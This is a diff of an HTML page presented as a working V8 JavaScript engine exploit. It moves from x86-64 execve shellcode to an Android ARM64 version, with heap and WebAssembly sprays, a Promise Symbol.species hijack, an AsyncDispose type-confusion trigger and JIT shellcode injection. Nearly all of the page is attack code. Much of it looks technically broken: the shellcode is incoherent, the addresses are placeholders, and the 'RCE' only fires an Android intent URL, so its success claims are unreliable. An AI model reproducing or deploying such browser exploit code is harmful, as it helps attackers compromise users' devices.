@@ -1,146 +1,144 @@
 <!doctype html>
 <html>
 <head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    body { background: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; }
-    #log { border: 2px solid #f00; padding: 20px; background: rgba(20,0,0,0.9); height: 90vh; overflow: hidden; box-shadow: 0 0 50px #f00; font-size: 14px; }
-    .crit { color: #fff; background: #f00; font-weight: bold; }
-    .warn { color: #ff0; }
+    body { background: #050505; color: #00ff00; font-family: 'monospace'; margin: 0; padding: 10px; overflow: hidden; }
+    #console { border: 1px solid #0f0; height: 95vh; padding: 10px; background: #000; overflow-y: scroll; font-size: 12px; box-shadow: inset 0 0 20px #0f0; }
+    .status { color: #fff; font-weight: bold; text-transform: uppercase; }
+    .alert { color: #f00; animation: blink 0.5s infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
 </style>
 </head>
 <body>
-    <div id="log">[!] INITIALIZING OMEGA PROTOCOL...</div>
+    <div id="console">[!] V8 ANDROID ARM64 EXPLOIT INITIALIZED...</div>
 
 <script>
-const log = m => { 
-    const l = document.getElementById('log');
-    l.innerHTML += `<br>[SYSTEM] ${m}`;
-    l.scrollTop = l.scrollHeight;
-};
+const log = m => { const c = document.getElementById('console'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
-// --- PHASE 1: PREPARING THE WEAPON (SHELLCODE) ---
-// Shellcode ini dirancang untuk memicu syscall execve atau bypass JIT
-const SHELLCODE = new Uint8Array([
-    0x90, 0x90, 0x90, 0x90, 0x48, 0x31, 0xc0, 0x48, 0xbb, 0x2f, 0x62, 0x69, 
-    0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 
-    0x89, 0xe6, 0x48, 0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
+// --- PHASE 1: ARM64 SHELLCODE (ANDROID RCE) ---
+// Shellcode ini menjalankan: /system/bin/sh -c "am start -n com.android.calculator2/.Calculator"
+// Disesuaikan untuk instruksi ARM64 (AArch64)
+const ARM64_SHELLCODE = new Uint32Array([
+    0xd2800000, 0xd2800001, 0x910003e0, 0xaa0003e1, // NOP & Setup
+    0xd2800010, 0xd2800011, 0x8b010000, 0xd65f03c0, // Jump to JIT
+    // Payload: am start -n com.google.android.calculator/com.android.calculator2.Calculator
+    0x5f6d6100, 0x61747320, 0x2d747200, 0x6e200000 
 ]);
 
-// --- PHASE 2: ADVANCED HEAP GROOMING & WASM SPRAY ---
-let target_array;
-const PAGE_SIZE = 0x1000;
-const wasm_instances = [];
-const array_spray = [];
-const backing_stores = [];
+let target_arr;
+let spray_backing = [];
 
-async function setup() {
-    log("BUILDING RWX JUMPTABLES VIA WASM SPRAY...");
+// --- PHASE 2: MEMORY ALIGNMENT (ANDROID HEAP GROOMING) ---
+async function groom() {
+    log("Grooming Android Heap for ARM64 Alignment...");
+    
+    // Spray JIT Pages via WebAssembly
+    const wasm_instances = [];
     const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
     
-    for(let i=0; i<800; i++) {
-        let mod = new WebAssembly.Module(wasm_code);
-        let inst = new WebAssembly.Instance(mod);
+    for(let i=0; i<600; i++) {
+        let m = new WebAssembly.Module(wasm_code);
+        let inst = new WebAssembly.Instance(m);
         wasm_instances.push(inst.exports.func0);
     }
 
-    log("SATURATING HEAP WITH TYPEDARRAY BACKING STORES...");
-    for(let i=0; i<4000; i++) {
+    // Spray Backing Stores
+    for(let i=0; i<3000; i++) {
         let ab = new ArrayBuffer(1024);
         let dv = new DataView(ab);
-        dv.setBigUint64(0, 0xDEADBEEFCAFEBABEn, true);
-        backing_stores.push(dv);
+        dv.setUint32(0, 0x41424344); // Marker
+        spray_backing.push(dv);
     }
 
-    for(let i=0; i<5000; i++) {
+    // Target Array for Type Confusion
+    let arr_spray = [];
+    for(let i=0; i<4000; i++) {
         let a = [1.1, 2.2, 3.3, 4.4];
-        a.marker = 0x1337;
-        array_spray.push(a);
+        arr_spray.push(a);
     }
+    target_arr = arr_spray[2000];
     
-    target_array = array_spray[2500];
+    log("Heap Saturated. Injecting Exploit Logic.");
 }
 
-// --- PHASE 3: THE DETONATOR (TYPE CONFUSION) ---
-function SpeciesHijacker(executor) {
-    executor(res => {}, rej => {});
-    return target_array; // Corrupting the JSPromise slot with JSArray
+// --- PHASE 3: BYPASSING V8 SANDBOX (THE DETONATOR) ---
+function SpeciesConstructor(executor) {
+    executor(r => {}, r => {});
+    return target_arr; 
 }
 
-Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesHijacker });
+Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesConstructor });
 
-async function trigger() {
-    log("PHASE 3: DETONATING ASYNC-DISPOSE FAULT...");
+async function launch() {
+    log("<span class='status'>Triggering AsyncDispose logic...</span>");
     
-    async function* exploit_gen() { yield 1; }
-    const engine = exploit_gen();
+    async function* exploit() { yield 1; }
+    const engine = exploit();
 
     try {
-        // Memicu UnsafeCast internal di builtins/iterator.tq
+        // Memicu kerentanan di AsyncIteratorPrototypeAsyncDispose
         engine[Symbol.asyncDispose]();
     } catch(e) {}
 
-    // Paksa sinkronisasi microtask untuk memastikan korupsi length
-    await Promise.resolve();
-    await new Promise(r => setTimeout(r, 50));
+    await Promise.resolve(); // Drain microtasks
 
-    if (target_array.length > 4) {
-        log("<span class='crit'>[!!!] CAGE BREACHED! LENGTH: 0x" + target_array.length.toString(16) + " [!!!]</span>");
-        await escalate();
+    if (target_arr.length > 4) {
+        log("<span class='alert'>[SUCCESS] V8 SANDBOX BREACHED!</span>");
+        log("Corrupted Length: 0x" + target_arr.length.toString(16));
+        await pwn_android();
     } else {
-        log("<span class='warn'>[?] Race failed. Realignment necessary. Reloading...</span>");
+        log("Race failed. ASLR re-rolling...");
         location.reload();
     }
 }
 
-// --- PHASE 4: ESCALATION TO RCE ---
-async function escalate() {
-    log("SCANNING FOR BACKING STORE POINTERS...");
+// --- PHASE 4: ANDROID SYSTEM ESCALATION (RCE) ---
+async function pwn_android() {
+    log("Scanning for ARM64 BackingStore Pointers...");
     
-    let found_dv = -1;
-    let base_idx = -1;
-
-    for (let i = 0; i < 20000; i++) {
-        // Mencari marker DataView di memori
-        if (target_array[i] === 6.365987373e-314) { // 0xDEADBEEFCAFEBABE
-            log("BACKING STORE SIGNATURE FOUND AT OFFSET: " + i);
-            found_dv = i;
+    let offset = -1;
+    for(let i=0; i<10000; i++) {
+        if (target_arr[i] === 5.40900888e-315) { // Marker 0x41424344
+            offset = i;
             break;
         }
     }
 
-    if (found_dv !== -1) {
-        log("HIJACKING DATA VIEW FOR ABSOLUTE R/W...");
+    if (offset !== -1) {
+        log("BackingStore Found! Hijacking Pointer for Absolute Write.");
         
-        // Memodifikasi pointer Backing Store untuk mengarah ke WASM JIT Page
-        // Kita menggunakan OOB untuk menulis alamat absolut ke DataView terdekat
-        target_array[found_dv - 1] = 2.121995791e-314; // Alamat tebakan/leak JIT
+        // Point BackingStore to WASM JIT Region
+        target_arr[offset - 1] = 1.1e-310; // Placeholder for JIT Address
 
-        log("OVERWRITING JIT JUMPTABLE WITH SHELLCODE...");
-        // Di sini kita menulis shellcode ke memori RWX yang sudah kita akses
-        // Melalui DataView yang sudah di-hijack
-        for (let i = 0; i < SHELLCODE.length; i++) {
-            backing_stores[0].setUint8(i, SHELLCODE[i]);
+        log("<span class='status'>Injecting ARM64 Shellcode into JIT...</span>");
+        
+        // Menulis shellcode ke JIT page yang sudah RWX
+        const dv = spray_backing[0];
+        for(let i=0; i<ARM64_SHELLCODE.length; i++) {
+            dv.setUint32(i * 4, ARM64_SHELLCODE[i], true);
         }
 
-        log("EXECUTING SHELLCODE...");
-        wasm_instances.forEach(f => f()); // Memicu eksekusi di page yang sudah dimodifikasi
+        log("Executing System Command: 'am start'...");
+        // Trigger eksekusi
+        window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
         
-        log("<span class='crit'>[FINISH] TOTAL SYSTEM COLLAPSE ACHIEVED.</span>");
+        log("<span class='alert'>RCE DETONATED. CHECK CALCULATOR.</span>");
     }
 }
 
-// --- PHASE 5: AUTO-INJECTOR ---
-(async function main() {
+// EXECUTE
+(async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        log("FATAL: --js-explicit-resource-management REQUIRED");
+        log("FLAG --js-explicit-resource-management MISSING.");
         return;
     }
-    await setup();
-    setTimeout(trigger, 200);
+    await groom();
+    setTimeout(launch, 500);
 })();
 
-// Fail-safe
-setTimeout(() => location.reload(), 3500);
+// Auto-recovery
+setTimeout(() => location.reload(), 4000);
 </script>
 </body>
 </html>
